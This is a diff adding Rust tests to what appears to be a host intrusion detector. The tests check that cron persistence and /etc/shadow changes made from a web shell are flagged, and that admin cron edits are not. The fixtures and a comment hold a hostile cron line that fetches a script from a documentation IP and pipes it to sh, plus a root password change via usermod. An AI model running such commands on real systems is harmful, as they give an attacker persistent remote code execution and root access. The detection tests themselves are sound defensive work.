@@ -965,6 +965,62 @@ mod tests {
         );
     }
 
+    #[test]
+    fn real_tools_run_from_a_web_shell_get_no_exemption() {
+        // (crontab -l; echo '* * * * * curl x|sh') | crontab -   from php-fpm.
+        let mut eng = engine_without_baseline();
+        let t = Utc::now();
+        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
+        eng.process(exec(t, 100, 1, 33, "php-fpm", "/usr/sbin/php-fpm8.2"));
+        eng.process(exec(t, 200, 100, 33, "sh", "/usr/bin/dash"));
+        eng.process(exec(t, 300, 200, 33, "crontab", "/usr/bin/crontab"));
+        let cron = eng.process(Event::File(file(
+            t,
+            "/var/spool/cron/crontabs/www-data",
+            FileKind::Modified,
+            Some(writer(300, 33, "crontab", 0)),
+            Some("* * * * * curl -s http://198.51.100.1/x | sh\n"),
+        )));
+        assert!(
+            has(&cron, DetectionId::D3, Severity::Critical),
+            "{:?}",
+            cron
+        );
+
+        // usermod -p <hash> root, the writer gone by the time inotify fires.
+        eng.process(exec(t, 301, 200, 0, "usermod", "/usr/sbin/usermod"));
+        let shadow = eng.process(Event::File(file(
+            t + Duration::seconds(1),
+            "/etc/shadow",
+            FileKind::MovedTo,
+            None,
+            None,
+        )));
+        assert!(
+            has(&shadow, DetectionId::D4, Severity::Critical),
+            "{:?}",
+            shadow
+        );
+    }
+
+    #[test]
+    fn admin_tools_from_a_session_stay_exempt() {
+        let mut eng = engine_without_baseline();
+        let t = Utc::now();
+        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
+        eng.process(exec(t, 50, 1, 0, "sshd", "/usr/sbin/sshd"));
+        eng.process(exec(t, 60, 50, 1000, "bash", "/usr/bin/bash"));
+        eng.process(exec(t, 70, 60, 1000, "crontab", "/usr/bin/crontab"));
+        let a = eng.process(Event::File(file(
+            t,
+            "/var/spool/cron/crontabs/dev",
+            FileKind::Modified,
+            Some(writer(70, 1000, "crontab", 1)),
+            Some("0 3 * * * /usr/bin/backup\n"),
+        )));
+        assert!(a.is_empty(), "{:?}", a);
+    }
+
     // ---- D4 -------------------------------------------------------------
 
     #[test]
